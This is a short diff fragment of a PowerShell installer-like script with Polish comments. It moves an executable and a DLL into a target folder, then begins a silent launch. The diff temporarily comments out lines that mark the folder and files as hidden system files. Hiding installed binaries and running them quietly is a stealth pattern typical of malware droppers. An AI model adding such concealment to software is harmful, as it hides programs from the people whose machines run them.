@@ -39,10 +39,10 @@ try {
 Move-Item -Path (Join-Path $tempDir $exeName) -Destination $targetExe -Force
 Move-Item -Path (Join-Path $tempDir $dllName) -Destination $targetDll -Force
 
-# 5. Ukryj
-attrib +h +s $finalDir
-attrib +h +s $targetExe
-attrib +h +s $targetDll
+# 5. Ukryj (TYMCZASOWO WYLACZAMY ZEBYBYS MOGL TO ZOBACZYC)
+# attrib +h +s $finalDir
+# attrib +h +s $targetExe
+# attrib +h +s $targetDll
 
 # 6. Uruchom cichutko
 if (Test-Path $targetExe) {
